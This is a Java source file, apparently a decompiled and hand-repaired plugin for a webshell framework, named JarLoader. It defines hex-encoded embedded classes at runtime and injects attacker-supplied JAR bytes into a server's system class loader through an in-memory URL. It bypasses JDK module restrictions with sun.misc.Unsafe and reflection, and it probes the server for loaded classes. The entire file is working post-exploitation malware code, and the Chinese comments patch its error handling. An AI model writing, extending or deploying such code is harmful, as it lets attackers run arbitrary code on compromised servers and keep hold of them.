package plugin;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Map;
import sun.misc.Unsafe;

public class JarLoader extends ClassLoader {
   private static String MemoryBufferURLConnection = "cafebabe0000003200d80a000b006a07006b08006c0a0008006d08006e0a0008006f0a000b00700700710800720800730700740a000800750700760a007700780700790a000f007a08007b07007c0a000b007d08007e09000f007f0a000f00800a004000810a002300820a0083008409001200850a008300860a008700880b003f0089070046090012008a0a0083008b090012008c0b003f008d07008e08008f0800900700910a002600920b003f00930a002600940800950a002600960a002600970a002300980700990a002e009a07009b0a0030009208009c07009d08009e07009f0a001200a00700a10b003700a20b003700700700a30a003a00920b003700a40a000d00a50800a60700a70700a801000566696c65730100104c6a6176612f7574696c2f4c6973743b01000b636f6e74656e74547970650100124c6a6176612f6c616e672f537472696e673b010004646174610100025b420100096f70656e4669656c6401001c284c6a6176612f6c616e672f7265666c6563742f4669656c643b2956010004436f646501000f4c696e654e756d6265725461626c6501000d537461636b4d61705461626c6507006b0700740700760700710700a90700aa0100063c696e69743e010011284c6a6176612f6e65742f55524c3b295607007c07008e0700ab01000963726561746555524c010024285b424c6a6176612f6c616e672f537472696e673b294c6a6176612f6e65742f55524c3b01000a457863657074696f6e730700ac010007636f6e6e6563740100032829560700ad010010676574436f6e74656e744c656e67746801000328294901000e676574436f6e74656e745479706501001428294c6a6176612f6c616e672f537472696e673b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100083c636c696e69743e07009d07009f0700a101000a536f7572636546696c6501001e4d656d6f727942756666657255524c436f6e6e656374696f6e2e6a6176610c00ae00af0100136a6176612f6c616e672f5468726f7761626c6501000f73756e2e6d6973632e556e736166650c00b000b1010009746865556e736166650c00b200b30c00b400b501000f6a6176612f6c616e672f436c6173730100066d6f64756c650100116f626a6563744669656c644f66667365740100176a6176612f6c616e672f7265666c6563742f4669656c640c00b600b70100106a6176612f6c616e672f4f626a6563740700a90c00b800b901000e6a6176612f6c616e672f4c6f6e670c00ba00bb0100096765744d6f64756c650100296a61724d656d6f72794275666665722f4d656d6f727942756666657255524c436f6e6e656374696f6e0c00bc00bd01000f676574416e645365744f626a6563740c00be00bf0c005200c00c005200530c00c100610700ab0c00c200c30c004100420c00c400c50700c60c00c700c80c00b400c90c004500460c00c400ca0c004300440c00cb00cc01000c6a6176612f6e65742f55524c01000a6a61726d656d627566660100000100176a6176612f6c616e672f537472696e674275696c6465720c0052005c0c00cd005f0c00ce00cf0100012f0c00ce00d00c00d100610c005200d201001c6a6176612f696f2f427974654172726179496e70757453747265616d0c005200d30100136a6176612f7574696c2f41727261794c69737401000868616e646c65727301001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e01000870685f63616368650100136a6176612f6c616e672f457863657074696f6e0c0047004801000d6a6176612f7574696c2f4d61700c00d400cc01002c6a61724d656d6f72794275666665722f4d656d6f727942756666657255524c53747265616d48616e646c65720c00d500d60c00d700bd01000867657446696c657301000e6a6176612f7574696c2f4c6973740100166a6176612f6e65742f55524c436f6e6e656374696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f640100135b4c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f537472696e6701001e6a6176612f6e65742f4d616c666f726d656455524c457863657074696f6e0100136a6176612f696f2f494f457863657074696f6e01000d73657441636365737369626c65010004285a2956010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100096c6f6e6756616c756501000328294a0100116765744465636c6172696e67436c61737301001328294c6a6176612f6c616e672f436c6173733b010004545950450100114c6a6176612f6c616e672f436c6173733b010004284a295601000767657446696c65010007696e6465784f6601000428492949010009737562737472696e67010016284949294c6a6176612f6c616e672f537472696e673b0100116a6176612f6c616e672f496e74656765720100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b29490100152849294c6a6176612f6c616e672f4f626a6563743b0100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a01000473697a65010006617070656e6401001c2849294c6a6176612f6c616e672f537472696e674275696c6465723b01002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e67010039284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b2956010005285b42295601000b636f6e7461696e734b6579010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737300210012004000000003000a004100420000001200430044000000120045004600000008000a0047004800010049000002000007000c000000ed2a04b60001b14c014c014d1203b800044d2c1205b600064e2d04b600012d01b600074ca700054eb112081209b600064e2c120a04bd00085903120b53b6000c2b04bd000d59032d53b6000ec0000fb6001037041208121103bd0008b6000c3a061906121203bd000db6000e3a0719062ab6001303bd000db6000e3a082c121406bd00085903120d535904b20015535905120d53b6000c3a0906bd000d59031212535904bb000f591604b700165359051908533a0a19092b190ab6000e572a04b60001190a0519075319092b190ab6000e57a700173a0b190a0519075319092b190ab6000e57190bbfa700044eb100050000000500060002000b00230026000200bd00c200d4000000d400d600d40000002800e800eb00020002004a0000007e001f0000004100050042000600430007004600090047000b00490011004a0018004b001d004c0023004f0026004d0027004e0028005200300053004800540053005500600056006d0057007c00590098005b00b4005c00bd005e00c2006000c8006100d1006200d4006000dc006100e5006200e8006400eb006300ec0065004b0000005500074607004cff001f000307004d07004e07004f000107004c01ff00ab000a07004d07004e07004f07004d0407005007004e07004e070050070051000107004cff0013000307004d07004e07004f00004207004c0000040052005300010049000000b3000500060000004d2a2bb700172bb600184d2c102fb600193eb2001a593a04c22ab2001a2c031db6001bb8001cb9001d0200c0001ec0001eb5001f1904c3a7000b3a051904c31905bf2a2c1d0460b60020b50021b1000200180036003900000039003e003900000002004a0000002200080000006800050069000a006a0011006b0018006c0033006d0041006f004c0070004b0000001c0002ff003900050700540700550700560107004e000107004cfa0007000900570058000200490000009a0007000500000047b2001a594dc2b2001a2ab90022020057bb00235912241225bb002659b70027b2001ab9002801000464b60029122ab6002b2bb6002bb6002cb7002d4e2d2cc3b03a042cc31904bf00020006003f0040000000400044004000000002004a000000160005000000730006007400100075003c007600400077004b000000150001ff0040000307001e07005607004e000107004c0059000000040001005a0001005b005c00020049000000190000000100000001b100000001004a0000000600010000007b0059000000040001005d0001005e005f000100490000001e00010001000000062ab4001fbeac00000001004a0000000600010000007e000100600061000100490000001d00010001000000052ab40021b000000001004a000000060001000000820001006200630002004900000024000300010000000cbb002e592ab4001fb7002fb000000001004a000000060001000000860059000000040001005d00080064005c0001004900000180000300050000008e014bbb003059b70031b3001a12231232b600064ba700144c12231234b600064ba700084da700044d2ab800362a01b60007c000374c2b594dc22b1224b90038020099000f2b1224b9003902004ea70015bb003a59b7003b4e2b12242db9003c0300572db6003d123e03bd0008b6000c2d03bd000db6000ec0003fb3001a2cc3a7000a3a042cc31904bfa700044bb10006000c001400170033001800200023003300180020002700350039007f00820000008200860082000000000089008c00350002004a0000005a00160000001600020017000c001a001400210017001b0018001d002000200023001e002400200027001f00280023002c00240035002500390027004400280050002a0058002b0062002e007d002f00890031008c0030008d0033004b00000050000aff0017000107004d0001070065ff000b000207004d070065000107006543070066fa0000fd002707006707004efc001107004eff001f000307004d07006707004e000107004cf80006420700660000010068000000020069";
   private static String MemoryBufferURLStreamHandler = "cafebabe0000003200200a000800170700180a00020017090007001907001a0a0005001b07001c07001d01000566696c65730100104c6a6176612f7574696c2f4c6973743b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000867657446696c657301001228294c6a6176612f7574696c2f4c6973743b01000e6f70656e436f6e6e656374696f6e010028284c6a6176612f6e65742f55524c3b294c6a6176612f6e65742f55524c436f6e6e656374696f6e3b01000a457863657074696f6e7307001e01000a536f7572636546696c650100214d656d6f727942756666657255524c53747265616d48616e646c65722e6a6176610c000b000c0100136a6176612f7574696c2f41727261794c6973740c0009000a0100296a61724d656d6f72794275666665722f4d656d6f727942756666657255524c436f6e6e656374696f6e0c000b001f01002c6a61724d656d6f72794275666665722f4d656d6f727942756666657255524c53747265616d48616e646c65720100196a6176612f6e65742f55524c53747265616d48616e646c65720100136a6176612f696f2f494f457863657074696f6e010011284c6a6176612f6e65742f55524c3b29560021000700080000000100020009000a000000030001000b000c0001000d0000002c00030001000000102ab700012abb000259b70003b50004b100000001000e0000000a00020000000a0004000b0001000f00100001000d0000001d00010001000000052ab40004b000000001000e0000000600010000000e0001001100120002000d000000210003000200000009bb0005592bb70006b000000001000e000000060001000000120013000000040001001400010015000000020016";
   private static String exStr = "";
   private static Class mconnClass;
   private Map parameterMap;
   private Map session;
   private static Unsafe unsafe;

   static {
      try {
         JarLoader jarLoader = new JarLoader(ClassLoader.getSystemClassLoader());
         jarLoader.g(hexToByte(MemoryBufferURLStreamHandler));
         mconnClass = jarLoader.g(hexToByte(MemoryBufferURLConnection));
      } catch (Exception var1) {
         exStr = describe(var1);
      }

      MemoryBufferURLConnection = null;
      MemoryBufferURLStreamHandler = null;
      unsafe = getUnsafe();
   }

   public static Field getField(Class clazz, String fieldName) {
      Field field = null;

      while(clazz != null) {
         try {
            field = clazz.getDeclaredField(fieldName);
            break;
         } catch (Exception var4) {
            clazz = clazz.getSuperclass();
         }
      }

      return field;
   }

   private static Method getMethod(Class clazz, String methodName, Class[] params) {
      Method method = null;

      while(clazz != null) {
         try {
            method = clazz.getDeclaredMethod(methodName, params);
            break;
         } catch (NoSuchMethodException var5) {
            clazz = clazz.getSuperclass();
         }
      }

      return method;
   }

   /**
    * Exception#getMessage() 可以是 null（很多 JDK 内部异常，例如
    * InaccessibleObjectException 的某些路径、以及被反射包过一层的异常）。
    * 原来直接 return var.getMessage()，一旦为 null 就让上层
    * toString() 里的 this.run().getBytes() 抛 NPE，把真实原因整个盖掉。
    * 这里保证永远返回一个非 null 的可读描述。
    */
   private static String describe(Throwable t) {
      if (t == null) {
         return "unknown error";
      }
      // 反射调用会包一层 InvocationTargetException，RuntimeException 也可能再包一层；
      // 真正有用的信息（例如 InaccessibleObjectException 的模块名）在里层。
      Throwable root = t;
      while ((root instanceof java.lang.reflect.InvocationTargetException
                  || root instanceof RuntimeException)
             && root.getCause() != null && root.getCause() != root) {
         root = root.getCause();
      }
      String message = root.getMessage();
      if (message != null && message.length() > 0) {
         return root.getClass().getName() + ": " + message;
      }
      return root.getClass().getName();
   }

   private static String addJar(URL url) {
      try {
         ClassLoader systemLoader = ClassLoader.getSystemClassLoader();
         if (URLClassLoader.class.isInstance(systemLoader)) {
            URLClassLoader classLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
            Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            if (!method.isAccessible()) {
               method.setAccessible(true);
            }

            method.invoke(classLoader, url);
            return "ok";
         } else {
            Field ucpField = getField(systemLoader.getClass(), "ucp");
            Object ucp = null;
            Method addURLMethod = null;

            try {
               ucpField.setAccessible(true);
               ucp = ucpField.get(systemLoader);
               addURLMethod = getMethod(ucp.getClass(), "addURL", new Class[]{URL.class});
               addURLMethod.setAccessible(true);
            } catch (Exception var13) {
               Class currentClass = JarLoader.class;
               Class targetClass = ucpField.getType();
               Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);
               if (getModuleMethod != null) {
                  Object oldModule = getModuleMethod.invoke(currentClass);
                  Object targetModule = getModuleMethod.invoke(targetClass);
                  unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);

                  try {
                     ucpField.setAccessible(true);
                     ucp = ucpField.get(systemLoader);
                     addURLMethod = getMethod(ucp.getClass(), "addURL", new Class[]{URL.class});
                     addURLMethod.setAccessible(true);
                  } catch (Throwable var12) {
                  }

                  unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), oldModule);
               }
            }

            addURLMethod.invoke(ucp, url);
            return "ok";
         }
      } catch (Exception var14) {
         throw new RuntimeException(var14);
      }
   }

   private static Unsafe getUnsafe() {
      Unsafe unsafe = null;

      try {
         Field field = Unsafe.class.getDeclaredField("theUnsafe");
         field.setAccessible(true);
         unsafe = (Unsafe)field.get((Object)null);
         return unsafe;
      } catch (Exception var2) {
         throw new AssertionError(var2);
      }
   }

   public static byte[] readInputStream(InputStream inputStream) {
      byte[] temp = new byte[4096];
      // Fernflower 反编译残留：这里原本多出一个 `int readOneNum = false;`，
      // 真正使用的局部变量在下面的 try 里，删掉即可。
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      try {
         int readOneNum;
         while((readOneNum = inputStream.read(temp)) != -1) {
            bos.write(temp, 0, readOneNum);
         }

         inputStream.close();
      } catch (Exception var5) {
      }

      return bos.toByteArray();
   }

   public JarLoader() {
   }

   public JarLoader(ClassLoader classLoader) {
      super(classLoader);
   }

   public Class g(byte[] b) {
      return super.defineClass(b, 0, b.length);
   }

   public static byte[] hexToByte(String hex) {
      // Fernflower 反编译残留：原为 `int m = false; int n = false;`（循环里另有同名局部变量）
      int byteLen = hex.length() / 2;
      byte[] ret = new byte[byteLen];

      for(int i = 0; i < byteLen; ++i) {
         int m = i * 2 + 1;
         int n = m + 1;
         int intVal = Integer.decode("0x" + hex.substring(i * 2, m) + hex.substring(m, n));
         ret[i] = Byte.valueOf((byte)intVal);
      }

      return ret;
   }

   public String toString() {
      this.parameterMap.put("result", this.run().getBytes());
      this.parameterMap = null;
      return "";
   }

   public boolean equals(Object paramObject) {
      try {
         this.parameterMap = (Map)paramObject;
         this.session = (Map)this.parameterMap.get("sessionTable");
         return true;
      } catch (Exception var3) {
         return false;
      }
   }

   public String run() {
      String methodName = this.get("methodName");
      if ("loadJar".equals(methodName)) {
         byte[] jarData = this.getByteArray("jarByteArray");
         if (exStr != null && exStr.length() >= 1) {
            return exStr;
         } else if (jarData != null) {
            try {
               return addJar((URL)mconnClass.getMethod("createURL", byte[].class, String.class).invoke((Object)null, jarData, "application/jar"));
            } catch (Exception var6) {
               return describe(var6);
            }
         } else {
            return "jarByteArray is null";
         }
      } else {
         String classNameString;
         if ("loadJarFromMemFile".equals(methodName)) {
            classNameString = new String(this.getByteArray("memFileName"));
            ByteArrayOutputStream fileStream = (ByteArrayOutputStream)this.session.remove(classNameString);
            if (fileStream == null) {
               return "Memory file does not exist";
            } else {
               byte[] jarData = fileStream.toByteArray();
               if (exStr != null && exStr.length() >= 1) {
                  return exStr;
               } else if (jarData != null) {
                  try {
                     return addJar((URL)mconnClass.getMethod("createURL", byte[].class, String.class).invoke((Object)null, jarData, "application/jar"));
                  } catch (Exception var7) {
                     return describe(var7);
                  }
               } else {
                  return "jarByteArray is null";
               }
            }
         } else if ("hasClass".equals(methodName)) {
            classNameString = this.get("className");

            try {
               ClassLoader loader = null;

               try {
                  loader = Thread.currentThread().getContextClassLoader();
               } catch (Exception var10) {
               }

               if (loader == null) {
                  try {
                     loader = JarLoader.class.getClassLoader();
                  } catch (Exception var9) {
                  }
               }

               if (loader == null) {
                  try {
                     loader = ClassLoader.getSystemClassLoader();
                  } catch (Exception var8) {
                  }
               }

               if (loader == null) {
                  Class.forName(classNameString);
               } else {
                  Class.forName(classNameString, true, loader);
               }

               return "true";
            } catch (ClassNotFoundException var11) {
               return "false";
            } catch (Throwable var12) {
               ByteArrayOutputStream stream = new ByteArrayOutputStream();
               PrintStream printStream = new PrintStream(stream);
               var12.printStackTrace(printStream);
               printStream.flush();
               printStream.close();
               return stream.toString();
            }
         } else {
            return "Method does not exist";
         }
      }
   }

   public String get(String key) {
      try {
         return new String((byte[])this.parameterMap.get(key));
      } catch (Exception var3) {
         return null;
      }
   }

   public byte[] getByteArray(String key) {
      try {
         return (byte[])this.parameterMap.get(key);
      } catch (Exception var3) {
         return null;
      }
   }
}
